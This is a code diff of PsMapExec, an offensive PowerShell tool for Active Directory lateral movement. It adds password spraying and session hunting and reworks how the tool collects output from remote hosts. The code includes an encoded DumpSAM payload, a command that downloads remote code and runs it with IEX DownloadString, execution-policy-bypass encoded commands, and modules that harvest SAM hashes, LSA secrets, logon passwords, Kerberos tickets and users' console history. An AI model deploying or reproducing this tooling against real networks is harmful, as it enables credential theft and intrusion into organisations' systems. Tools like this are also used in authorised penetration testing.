@@ -67,8 +67,16 @@ Param(
     [Switch]$EmptyPassword
 )
 
+# Check for mandatory parameter
+
+
 $startTime = Get-Date
 Set-Variable MaximumHistoryCount 32767
+
+# Set the targets variable if not provided when spraying
+if ($Method -eq "Spray" -and $Targets -eq ""){
+$Targets = "all"
+}
 
 ################################################################################################################
 ###################################### Banner and version information ##########################################
@@ -88,8 +96,16 @@ Write-Output $Banner
 Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
-Write-Host "0.3.2"
+Write-Host "0.3.4"
 Write-Host
+
+# If no targets have been provided
+if (-not $Targets -and $Method -ne "Spray") {
+    Write-host "[-]  " -ForegroundColor "Red" -NoNewline
+    Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
+    return
+}
+
 
 
 ################################################################################################################
@@ -126,11 +142,16 @@ if ($CurrentUser -and $Method -eq "RDP"){
         return
 }
 
-elseif ($CurrentUser -and $Method -ne "RDP"){
+    if ($CurrentUser) {
+        if ($Hash -ne "" -or $Password -ne "" -or $Username -ne "" -or $Ticket -ne "") {
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "The switch -CurrentUser has been provided with a credential parameter ""e.g.: -Username, -Password"""
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "PsMapExec will continue in the current users context """
+            Start-Sleep -Seconds 5
+        }
+    }
 
-        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Running in context of the current user:  $env:USERDNSDOMAIN\$env:USERNAME"
-}
 
 
 # Check script modules
@@ -259,6 +280,8 @@ $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.Windows
 ########################################## Domain Target Acquisition ###########################################
 ################################################################################################################
 
+
+if ($Method -ne "Spray"){
 $directoryEntry = [ADSI]"LDAP://$domain"
 $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
 $searcher.PageSize = 1000
@@ -290,33 +313,30 @@ $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0
 
 }
 
-elseif ($Targets -is [string]) {
+
+elseif ($Method -ne "Spray"){
+if ($Targets -is [string]) {
     $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
     if ($ipAddress) {
         Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
         break
     }
     else {
-        $directoryEntry = [ADSI]"LDAP://$domain"
-        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*))"
-        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
         
         if ($Targets -notlike "*.*") {
             $Targets = $Targets + "." + $Domain
         }
         
         $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
+            
+            }
+        }
     }
 }
 
 
-else {
-    Write-Host "Invalid value for Targets. Must be Workstations, Servers, DC, All, an IP address or a system name." -ForegroundColor "Red"
-    break
-}
 # Dispose the searcher after use
-$searcher.Dispose()
+#$searcher.Dispose()
 
 
 
@@ -372,6 +392,40 @@ $EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction
 $ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
 $AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
 
+$FQDNDomainName = $domain.ToLower()
+$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
+$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
+$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
+$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
+
+if ($Method -eq "Spray") {
+    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
+        $Targets = $EnabledDomainUsers
+    }
+    elseif ($Targets -in $EnabledDomainUsers) {
+        $EnabledDomainUsers = $Targets
+    }
+    else {
+        $groupMembers = Get-GroupMembers -GroupName $Targets
+        if ($groupMembers.Count -gt 0) {
+            $EnabledDomainUsers = $groupMembers
+        }
+        elseif ($groupMembers.Count -eq 0) {
+            Write-host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-host "Group either does not exist or is empty"
+            return
+        }
+        else {
+            Write-host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Unspecified Error"
+            return
+        }
+    }
+}
+
+
+
+
 # Grab Computer Accounts for spraying
 function Get-ComputerAccounts {
     $searcher = New-Searcher
@@ -389,6 +443,7 @@ function Get-ComputerAccounts {
 
 $ComputerSamAccounts = Get-ComputerAccounts
 $searcher.Dispose()
+
 
 
 if (!$LocalAuth){
@@ -501,20 +556,6 @@ function Invoke-Rubeus{
 # Set the userDomain when impersonating a user in one domain for access to an alternate domain
 if ($UserDomain -ne ""){}
 
-
-# Set the variable "CurrentUser" to $True if the switch -GenRelayList is used.
-if (
-    $Method -eq "GenRelayList" -or
-    $Method -eq "SessionHunter" -or
-    $Method -eq "Spray" -or
-    $LocalAuth
-) {
-    $CurrentUser = $True
-}
-
-if ($Username -eq ""){
-    $CurrentUser = $True
-}
 
 # Check if the current user is an administrator
 $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -694,7 +735,14 @@ if (!$CurrentUser) {
 ################################## Information based on selected module ########################################
 ################################################################################################################
 
-
+if ($Method -eq "SessionHunter"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Searching for systems where privileged users credentials might be in running memory"
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Filtering by those which we have admin rights to"
+    Write-Host
+    Start-Sleep -Seconds 3
+}
 
 if ($Module -eq "KerbDump"){
     Write-Host "- " -ForegroundColor "Yellow" -NoNewline
@@ -784,10 +832,7 @@ elseif ($Module -eq "Files"){
     }
 }
 
-elseif ($Method -eq "SessionHunter"){
-    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Active sessions output will be written to $Sessions"
-}
+
 
 elseif ($Method -eq "GenRelayList"){
     Write-Host "- " -ForegroundColor "Yellow" -NoNewline
@@ -802,10 +847,14 @@ $ConsoleHostHistory = @'
 $usersFolderPath = "C:\Users"
 $users = Get-ChildItem -Path $usersFolderPath -Directory
 
+$foundHistoryFile = $false
+
 foreach ($User in $Users) {
     $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
     if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
+        $foundHistoryFile = $true
+
         $historyContent = Get-Content -Path $historyFilePath -Raw
         $historyLines = $historyContent -split "`n"
         Write-output ""
@@ -813,9 +862,14 @@ foreach ($User in $Users) {
         $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
     }
 }
+
+if (-not $foundHistoryFile) {
+    Write-Output "No Results"
+}
+
 '@
 
-if ($Method -eq "WMI"){
+
 
 $Files = @'
 $usersFolderPath = "C:\Users"
@@ -903,99 +957,9 @@ foreach ($user in $users) {
 }
 '@
 
-}
 
-if ($Method -ne "WMI"){
-$Files = @'
-$usersFolderPath = "C:\Users"
-$users = Get-ChildItem -Path $usersFolderPath -Directory
 
-$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk", "*.tmp")
-$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")
 
-foreach ($user in $users) {
-    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
-    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
-    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
-    $userHome = $user.FullName
-
-    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
-    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
-    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
-    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue
-
-    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-
-    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0
-
-    if ($hasFiles) {
-        Write-Output ""
-        Write-Output "----------------------------------------------------------------------------------------------"
-        Write-Output ("[User] $user")
-        Write-Output
-
-        if ($downloadsFiles.Count -gt 0) {
-        ""
-            Write-Output ("[Downloads]")
-            $downloadsFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-
-        if ($documentsFiles.Count -gt 0) {
-        ""
-            Write-Output
-            Write-Output ("[Documents]")
-            $documentsFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-
-        if ($desktopFiles.Count -gt 0) {
-        ""
-            Write-Output
-            Write-Output ("[Desktop]")
-            $desktopFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-
-        if ($homeFiles.Count -gt 0) {
-        ""
-            Write-Output
-            Write-Output ("[Home]")
-            $homeFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-        Write-Output "----------------------------------------------------------------------------------------------"
-    }
-}
-'@
-}
 
 $LocalSAM = @'
 function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
@@ -1034,7 +998,7 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 
 # Tickets - KerbDump
 if ($Module -eq "KerbDump"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
@@ -1072,6 +1036,8 @@ elseif ($Module -eq "disks"){
 $b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
+# Set module to "" for modules where we do not wish to save output for
+$Module = ""
 }
 
 # LoggedOnUsers
@@ -1079,6 +1045,8 @@ elseif ($Module -eq "LoggedOnUsers"){
 $b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
+# Set module to "" for modules where we do not wish to save output for
+$Module = ""
 }
 
 # Sessions
@@ -1086,6 +1054,8 @@ elseif ($Module -eq "Sessions"){
 $b64 = "Write-host; query user | Out-String"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
+# Set module to "" for modules where we do not wish to save output for
+$Module = ""
 }
 
 # ConsoleHistory
@@ -1112,14 +1082,16 @@ $Command = "powershell.exe -ep bypass -enc $base64Command"
 ################################# Logic to help keep output tidy and even ######################################
 ################################################################################################################
 
+if ($Method -ne "Spray"){
 $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
 $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
-
+}
 
 ################################################################################################################
 ################################################ Function: WMI #################################################
 ################################################################################################################
 Function Method-WMIexec {
+param ($ComputerName)
 Write-host
 
 $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
@@ -1147,6 +1119,8 @@ if ($wait) {
 
 $tcpClient.Close()
 if (!$connected) {return "Unable to connect"}
+
+
     
     Function LocalWMI {
 
@@ -1297,10 +1271,14 @@ param (
   [string]$Class = "PMEClass"
 )
 
-$osInfo = $null
 if ($Command -eq ""){
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinu"
+$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
     if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
+}
+
+if ($Command -ne ""){
+$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
+    if (!$osInfo){return "Access Denied"}
 }
 
 function CreateScriptInstance([string]$ComputerName) {
@@ -1433,85 +1411,86 @@ foreach ($computer in $computers) {
 
 # Poll the runspaces and display results as they complete
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
+            $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-            if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-
-}
-           
-            elseif ($result -eq "Unspecified Error"){
-            if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-
-}
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            } 
             
+            elseif ($result -eq "Unable to connect") {}
+
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
+
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
+                            $result | Write-Host
+                            Write-Host
+                            $hasDisplayedResult = $true
+                        }
+                    }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
+                }
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result) {
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            
-            if ($Module -eq ""){
-            $result | Write-Host 
-            Write-Host
-            
-            }
+             # Dispose of runspace and close handle
+            $runspace.Runspace.Dispose()
+            $runspace.Handle.AsyncWaitHandle.Close()
+        }
+    }
 
-    switch ($Module) {
-        "SAM" {
-            $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "LogonPasswords" {
-            $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "Tickets" {
-            $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "eKeys" {
-            $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "KerbDump" {
-            $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "LSA" {
-            $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "ConsoleHistory" {
-            $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "Files" {
-            $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-    }
-}
-            
-            # Catch all, really needs fixing. Something to do with $osinfo results not coming back to the runspace logic when a command is provided. Only affects WMI function not LocalWMI
-            else {if (!$SuccessOnly){Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength}}
-           
-        }
-    }
-    
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} while ($runspaces | Where-Object { -not $_.Completed })
 
 # Clean up
 $runspacePool.Close()
@@ -1552,19 +1531,14 @@ if ($wait) {
 $tcpClient.Close()
 if (!$connected) {return "Unable to connect" }   
     
-Function AccessCheck {
-    $SMBCheck = Test-Path "\\$ComputerName\ADMIN$"
-    
-    if (!$SMBCheck) {
-        return "Access Denied"
-    } elseif ($SMBCheck) {
-        if ($Command -eq "") {
-            return "Successful Connection PME"
-        } elseif ($Command -ne "") {}
-    }
-}
+    $Error.Clear()
 
-AccessCheck
+    ls \\$ComputerName\c$ > $null
+
+        $OurError=$Error[0]
+
+        if (($OurError) -eq $null){}
+        else {return "Access Denied"}
 
 
 
@@ -1576,7 +1550,7 @@ AccessCheck
 		[string]$ComputerName,
 		[string]$ServiceName,
 		[string]$Command,
-		[string]$Timeout = "3000"
+		[string]$Timeout = "45000"
 	)
 	
 	$ErrorActionPreference = "SilentlyContinue"
@@ -1691,9 +1665,8 @@ while (`$true) {
  	try {
 		$pipeClient.Connect($Timeout)
 	} catch [System.TimeoutException] {
-		Write-Output "[$($ComputerName)]: Connection timed out"
-		Write-Output ""
-		return
+		return "Timed Out"
+
 	} catch {
 		Write-Output "[$($ComputerName)]: An unexpected error occurred"
 		Write-Output ""
@@ -1795,82 +1768,87 @@ foreach ($computer in $computers) {
 
 # Poll the runspaces and display results as they complete
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
+            $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-            if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-
-}
-           
-            elseif ($result -eq "Unspecified Error"){
-            if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-
-}
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            } 
             
+            elseif ($result -eq "Unable to connect") {}
+
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
+
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
+                            $result | Write-Host
+                            Write-Host
+                            $hasDisplayedResult = $true
+                        }
+                    }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
+                }
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result) {
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            
-            if ($Module -eq ""){
-            $result | Write-Host 
-            Write-Host
-            
-            }
+             # Dispose of runspace and close handle
+            $runspace.Runspace.Dispose()
+            $runspace.Handle.AsyncWaitHandle.Close()
+        }
+    }
 
-    switch ($Module) {
-        "SAM" {
-            $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "LogonPasswords" {
-            $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "Tickets" {
-            $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "eKeys" {
-            $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "KerbDump" {
-            $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "LSA" {
-            $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "ConsoleHistory" {
-            $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "Files" {
-            $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-    }
-}
-           
-        }
-    }
-    
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} while ($runspaces | Where-Object { -not $_.Completed })
+
 
 # Clean up
 $runspacePool.Close()
@@ -1987,83 +1965,93 @@ foreach ($computer in $computers) {
 }
 
 # Poll the runspaces and display results as they complete
+
+
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
+            $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-            if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
